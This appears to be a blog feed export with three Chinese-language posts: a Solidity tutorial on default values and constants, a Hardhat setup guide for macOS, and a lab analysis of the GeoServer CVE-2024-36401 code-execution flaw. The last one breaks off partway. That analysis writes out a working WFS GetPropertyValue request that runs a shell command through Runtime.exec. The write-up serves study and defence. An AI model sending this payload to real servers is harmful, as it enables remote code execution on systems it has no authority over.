class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract InitialValue &#123;</span><br><span class="line">    // Value Types</span><br><span class="line">    bool public _bool; // false</span><br><span class="line">    string public _string; // &quot;&quot;</span><br><span class="line">    int public _int; // 0</span><br><span class="line">    uint public _uint; // 0</span><br><span class="line">    address public _address; // 0x0000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">    enum ActionSet &#123; Buy, Hold, Sell&#125;</span><br><span class="line">    ActionSet public _enum; // 第一个元素 0</span><br><span class="line"></span><br><span class="line">    function fi() internal&#123;&#125; // internal空白方程 </span><br><span class="line">    function fe() external&#123;&#125; // external空白方程 </span><br><span class="line"></span><br><span class="line">    // Reference Types</span><br><span class="line">    uint[8] public _staticArray; // 所有成员设为其默认值的静态数组[0,0,0,0,0,0,0,0]</span><br><span class="line">    uint[] public _dynamicArray; // `[]`</span><br><span class="line">    mapping(uint =&gt; address) public _mapping; // 所有元素都为其默认值的mapping</span><br><span class="line">    // 所有成员设为其默认值的结构体 0, 0</span><br><span class="line">    struct Student&#123;</span><br><span class="line">        uint256 id;</span><br><span class="line">        uint256 score; </span><br><span class="line">    &#125;</span><br><span class="line">    Student public student;</span><br><span class="line"></span><br><span class="line">    // delete操作符</span><br><span class="line">    bool public _bool2 = true; </span><br><span class="line">    function d() external &#123;</span><br><span class="line">        delete _bool2; // delete 会让_bool2变为默认值，false</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="值类型初始值">值类型初始值</h3><ul><li><p><code>boolean</code>: <code>false</code></p></li><li><p><code>string</code>: <code>&quot;&quot;</code></p></li><li><p><code>int</code>: <code>0</code></p></li><li><p><code>uint</code>: <code>0</code></p></li><li><p><code>enum</code>: 枚举中的第一个元素</p></li><li><p><code>address</code>: <code>0x0000000000000000000000000000000000000000</code> (或 <code>address(0)</code>)</p></li><li><p><code>function</code></p><ul><li><p><code>internal</code>: 空白函数</p></li><li><p><code>external</code>: 空白函数</p></li></ul></li></ul><p>可以用<code>public</code>变量的<code>getter</code>函数验证上面写的初始值是否正确：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bool public _bool; // false</span><br><span class="line">string public _string; // &quot;&quot;</span><br><span class="line">int public _int; // 0</span><br><span class="line">uint public _uint; // 0</span><br><span class="line">address public _address; // 0x0000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">enum ActionSet &#123; Buy, Hold, Sell&#125;</span><br><span class="line">ActionSet public _enum; // 第1个内容Buy的索引0</span><br><span class="line"></span><br><span class="line">function fi() internal&#123;&#125; // internal空白函数</span><br><span class="line">function fe() external&#123;&#125; // external空白函数 </span><br></pre></td></tr></table></figure><h3 id="引用类型初始值">引用类型初始值</h3><ul><li>映射<code>mapping</code>: 所有元素都为其默认值的<code>mapping</code></li><li>结构体<code>struct</code>: 所有成员设为其默认值的结构体</li><li>数组<code>array</code><ul><li>动态数组: <code>[]</code></li><li>静态数组（定长）: 所有成员设为其默认值的静态数组</li></ul></li></ul><p>可以用<code>public</code>变量的<code>getter</code>函数验证上面写的初始值是否正确：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// Reference Types</span><br><span class="line">uint[8] public _staticArray; // 所有成员设为其默认值的静态数组[0,0,0,0,0,0,0,0]</span><br><span class="line">uint[] public _dynamicArray; // `[]`</span><br><span class="line">mapping(uint =&gt; address) public _mapping; // 所有元素都为其默认值的mapping</span><br><span class="line">// 所有成员设为其默认值的结构体 0, 0</span><br><span class="line">struct Student&#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    uint256 score; </span><br><span class="line">&#125;</span><br><span class="line">Student public student;</span><br></pre></td></tr></table></figure><h3 id="delete操作符"><code>delete</code>操作符</h3><p><code>delete a</code>会让变量<code>a</code>的值变为初始值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// delete操作符</span><br><span class="line">bool public _bool2 = true; </span><br><span class="line">function d() external &#123;</span><br><span class="line">    delete _bool2; // delete 会让_bool2变为默认值，false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>值类型、引用类型<code>delete</code>操作后的默认值。</strong></p><h2 id="常数">常数</h2><p>这一讲，我们介绍Solidity中和常量相关的两个关键字，<code>constant</code>（常量）和<code>immutable</code>（不变量）。状态变量声明这两个关键字之后，不能在初始化后更改数值。这样做的好处是提升合约的安全性并节省<code>gas</code>。</p><p>另外，只有数值变量可以声明<code>constant</code>和<code>immutable</code>；<code>string</code>和<code>bytes</code>可以声明为<code>constant</code>，但不能为<code>immutable</code>。</p><p>测试代码<code>Constant.sol</code>，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Constant &#123;</span><br><span class="line">    // constant变量必须在声明的时候初始化，之后不能改变</span><br><span class="line">    uint256 public constant CONSTANT_NUM = 10;</span><br><span class="line">    string public constant CONSTANT_STRING = &quot;0xAA&quot;;</span><br><span class="line">    bytes public constant CONSTANT_BYTES = &quot;WTF&quot;;</span><br><span class="line">    address public constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000;</span><br><span class="line"></span><br><span class="line">    // immutable变量可以在constructor里初始化，之后不能改变</span><br><span class="line">    uint256 public immutable IMMUTABLE_NUM = 9999999999;</span><br><span class="line">    address public immutable IMMUTABLE_ADDRESS;</span><br><span class="line">    uint256 public immutable IMMUTABLE_BLOCK;</span><br><span class="line">    uint256 public immutable IMMUTABLE_TEST;</span><br><span class="line"></span><br><span class="line">    // 利用constructor初始化immutable变量，因此可以利用</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        IMMUTABLE_ADDRESS = address(this);</span><br><span class="line">        IMMUTABLE_NUM = 1118;</span><br><span class="line">        IMMUTABLE_TEST = test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test() public pure returns(uint256)&#123;</span><br><span class="line">        uint256 what = 9;</span><br><span class="line">        return(what);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="constant和immutable">constant和immutable</h3><h4 id="constant">constant</h4><p><code>constant</code>变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// constant变量必须在声明的时候初始化，之后不能改变</span><br><span class="line">uint256 constant CONSTANT_NUM = 10;</span><br><span class="line">string constant CONSTANT_STRING = &quot;0xAA&quot;;</span><br><span class="line">bytes constant CONSTANT_BYTES = &quot;WTF&quot;;</span><br><span class="line">address constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000;</span><br></pre></td></tr></table></figure><h4 id="immutable">immutable</h4><p><code>immutable</code>变量可以在声明时或构造函数中初始化，因此更加灵活。在<code>Solidity v8.0.21</code>以后，<code>immutable</code>变量不需要显式初始化。反之，则需要显式初始化。 若<code>immutable</code>变量既在声明时初始化，又在constructor中初始化，会使用constructor初始化的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// immutable变量可以在constructor里初始化，之后不能改变</span><br><span class="line">uint256 public immutable IMMUTABLE_NUM = 9999999999;</span><br><span class="line">address public immutable IMMUTABLE_ADDRESS;</span><br><span class="line">uint256 public immutable IMMUTABLE_BLOCK;</span><br><span class="line">uint256 public immutable IMMUTABLE_TEST;</span><br></pre></td></tr></table></figure><p>你可以使用全局变量例如<code>address(this)</code>，<code>block.number</code> 或者自定义的函数给<code>immutable</code>变量初始化。在下面这个例子，我们利用了<code>test()</code>函数给<code>IMMUTABLE_TEST</code>初始化为<code>9</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 利用constructor初始化immutable变量，因此可以利用</span><br><span class="line">constructor()&#123;</span><br><span class="line">    IMMUTABLE_ADDRESS = address(this);</span><br><span class="line">    IMMUTABLE_NUM = 1118;</span><br><span class="line">    IMMUTABLE_TEST = test();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test() public pure returns(uint256)&#123;</span><br><span class="line">    uint256 what = 9;</span><br><span class="line">    return(what);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250125011902342.png" alt="image-20250125011902342"></p><h2 id="参考">参考</h2><p><a href="https://www.wtf.academy/docs/solidity-101/HelloWeb3">https://www.wtf.academy/docs/solidity-101/HelloWeb3</a></p><p><a href="https://github.com/AmazingAng/WTF-Solidity">https://github.com/AmazingAng/WTF-Solidity</a></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 以太坊 </tag>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac搭建hardhat以太坊开发环境</title>
      <link href="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h2 id="Node环境配置">Node环境配置</h2><p>首先安装<code>nvm</code>，再安装<code>node18</code>，为了和<code>hardhat</code>的运行环境匹配</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install nvm</span><br></pre></td></tr></table></figure><p>配置nvm环境，在<code>～/.zshrc</code>中加入下面的内容。</p><p>编辑<code>～/.zshrc</code>，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure><p>加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export NVM_DIR=&quot;$HOME/.nvm&quot;</span><br><span class="line">[ -s &quot;/opt/homebrew/opt/nvm/nvm.sh&quot; ] &amp;&amp; \. &quot;/opt/homebrew/opt/nvm/nvm.sh&quot;  # This loads nvm</span><br><span class="line">[ -s &quot;/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm&quot; ] &amp;&amp; \. &quot;/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm&quot;  # This loads nvm bash_completion</span><br></pre></td></tr></table></figure><p>保存，并</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><p>配置好后，如下：</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113214138233.png" alt="image-20250113214138233"></p><p>接下来，安装<code>node18</code>，使用下面命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install 18</span><br></pre></td></tr></table></figure><p>如下，安装成功。</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113214511440.png" alt="image-20250113214511440"></p><h2 id="搭建hardhat环境">搭建hardhat环境</h2><p>创建一个目录，专门用于以太坊学习，随意，如<code>/Web3</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /Web3</span><br><span class="line">mkdir hardhat-simple-contract</span><br><span class="line">cd hardhat-simple-contract</span><br><span class="line">npm init -y</span><br><span class="line">npm install --save-dev hardhat</span><br></pre></td></tr></table></figure><p>然后初始化<code>hardhat</code>项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat</span><br></pre></td></tr></table></figure><p>选择第一个创建一个<code>JavaScript project</code>，项目路径选择刚开始创建文件夹的路径。</p><p>注意⚠️我这里是换了一个路径演示一下。</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113232445250.png" alt="image-20250113232445250"></p><p>初始化后的文件目录如下：</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113234740753.png" alt="image-20250113234740753"></p><p>其中的<code>scripts</code>文件夹需要自己创建。</p><h2 id="部署智能合约">部署智能合约</h2><p>进入到文件夹<code>contracts</code>下，创建合约文件<code>SimpleStorage.sol</code>，简单的部署一个合约，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint256 private storedValue;</span><br><span class="line"></span><br><span class="line">    event ValueChanged(uint256 newValue);</span><br><span class="line"></span><br><span class="line">    function set(uint256 value) public &#123;</span><br><span class="line">        storedValue = value;</span><br><span class="line">        emit ValueChanged(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get() public view returns (uint256) &#123;</span><br><span class="line">        return storedValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进入到创建的<code>scripts</code>文件夹下，创建部署合约的脚本<code>deploy.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hre = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 获取合约工厂</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">SimpleStorage</span> = <span class="keyword">await</span> hre.<span class="property">ethers</span>.<span class="title function_">getContractFactory</span>(<span class="string">&quot;SimpleStorage&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 部署合约</span></span><br><span class="line">    <span class="keyword">const</span> simpleStorage = <span class="keyword">await</span> <span class="title class_">SimpleStorage</span>.<span class="title function_">deploy</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 等待部署完成</span></span><br><span class="line">    <span class="keyword">await</span> simpleStorage.<span class="title function_">waitForDeployment</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取合约地址</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`SimpleStorage deployed to: <span class="subst">$&#123;simpleStorage.target&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">main</span>()</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> process.<span class="title function_">exit</span>(<span class="number">0</span>))</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">      process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>首先需要对编写的智能合约进行编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat compile</span><br></pre></td></tr></table></figure><p>编译成功后，会输出<code>Compiled 2 Solidity files successfully (evm target: paris)</code></p><p>然后启动本地的以太坊网络，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat node</span><br></pre></td></tr></table></figure><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113221945116.png" alt="image-20250113221945116"></p><p>以太坊网络启动成功。</p><p>进行合约的部署，执行部署的js文件如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat run scripts/deploy.js --network localhost</span><br></pre></td></tr></table></figure><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113222224915.png" alt="image-20250113222224915"></p><p>合约成功部署，得到部署合约的地址<code>0x5fbdb2315678afecb367f032d93f642f64180aa3</code>。</p><h2 id="调用合约函数">调用合约函数</h2><p>创建一个调用合约的代码<code>test.js</code>，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scripts/test.js</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">SimpleStorage</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractAt</span>(<span class="string">&quot;SimpleStorage&quot;</span>, <span class="string">&quot;0x5fbdb2315678afecb367f032d93f642f64180aa3&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在这里继续编写脚本逻辑，例如读取或调用合约方法</span></span><br><span class="line">    <span class="keyword">const</span> value = <span class="keyword">await</span> <span class="title class_">SimpleStorage</span>.<span class="title function_">set</span>(<span class="number">42</span>); <span class="comment">// 假设你的合约有一个 `get` 方法</span></span><br><span class="line">    <span class="comment">//const value = await SimpleStorage.get()</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Stored value:&quot;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 捕获错误</span></span><br><span class="line"><span class="title function_">main</span>().<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">    process.<span class="property">exitCode</span> = <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将其保存在<code>scripts</code>文件夹下。</p><p>代码的大致意思是，调用合约的<code>set</code>函数方法，设置值为<code>42</code>，然后再调用<code>get</code>方法去读取数据。</p><p>先是调用<code>set</code>方法，如图所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat run scripts/test.js  --network localhost</span><br></pre></td></tr></table></figure><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113235445672.png" alt="image-20250113235445672"></p><p>然后再调用<code>get</code>方法，获取<code>set</code>的值。</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113235806214.png" alt="image-20250113235806214"></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 以太坊 </tag>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GeoServer代码执行漏洞(CVE-2024-36401)</title>
      <link href="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/"/>
      <url>/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/</url>
      
        <content type="html"><![CDATA[<h2 id="配置调试环境">配置调试环境</h2><p>调试漏洞的GeoServer版本号为2.23.2，获取源代码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/geoserver/geoserver #下载</span><br><span class="line">git tag #查看全部的版本</span><br><span class="line">git checkout tags/2.23.2 #切换至2.23.2版本</span><br></pre></td></tr></table></figure><p>使用vulhub进行漏洞的远程调试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/vulhub/geoserver/CVE-2024-36401/</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>IntelliJ IDEA打开geoserver的源代码，添加运行Remote JVM Debug，端口默认为5005。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109204237470.png" alt="image-20250109204237470"></p><p>然后对代码进行断点调试。</p><h2 id="浅析代码">浅析代码</h2><h3 id="官方通告">官方通告</h3><p>漏洞通告：</p><p><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a><br>GeoTool组件通告：</p><p><a href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a><br>Jxpath漏洞利用：</p><p><a href="https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852">https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852</a></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109220637144.png" alt="image-20250109220637144"></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109220231306.png" alt="image-20250109220231306"></p><p>从官方的通报中可以注意到，若XPath表达式由用户输入提供，则会出现安全问题。存在安全问题的接口为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)</span><br><span class="line">org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)</span><br><span class="line">org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)</span><br><span class="line">org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class&lt;T&gt;)</span><br><span class="line">org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)</span><br><span class="line">org.geotools.data.complex.expression.MapPropertyAccessorFactory.<span class="keyword">new</span> <span class="title class_">PropertyAccessor</span>() &#123;...&#125;.get(Object, String, Class&lt;T&gt;)</span><br><span class="line">org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)</span><br></pre></td></tr></table></figure><p>测试样例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">org</span>.geotools.xsd.StreamingParser(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">org</span>.geotools.filter.v1_0.OGCConfiguration(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayInputStream(<span class="string">&quot;&lt;Filter&gt;&lt;/Filter&gt;&quot;</span>.getBytes()),</span><br><span class="line">                <span class="string">&quot;java.lang.Thread.sleep(5000)&quot;</span>)</span><br><span class="line">        .parse();</span><br></pre></td></tr></table></figure><h3 id="漏洞复现">漏洞复现</h3><p>若用户输入的参数，传输到了这些存在漏洞的类中，参数会经过JXPath引擎去进行解析，从而导致代码执行。漏洞本质是JXPath漏洞，JXpath漏洞是Apache Commons JXPath之前爆出的漏洞（CVE-2022-41852），这个JXPath对传统的XPath语句进行了拓展，支持XPath语句中插入一些表达式语言的特性，能够调用任意public的静态方法等导致任意代码执行。</p><p>官网给出的可能存在漏洞的请求</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">WFS GetFeature</span><br><span class="line">WFS GetPropertyValue</span><br><span class="line">WMS GetMap</span><br><span class="line">WMS GetFeatureInfo</span><br><span class="line">WMS GetLegendGraphic</span><br><span class="line">WPS Execut</span><br></pre></td></tr></table></figure><p>查询官网</p><p><a href="https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html">https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html</a></p><p>WFS GetPropertyValue请求如下：</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109222248139.png" alt="image-20250109222248139"></p><p>GET请求即可触发漏洞：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),%27touch%20/tmp/success2%27)</span><br></pre></td></tr></table></figure><p><img 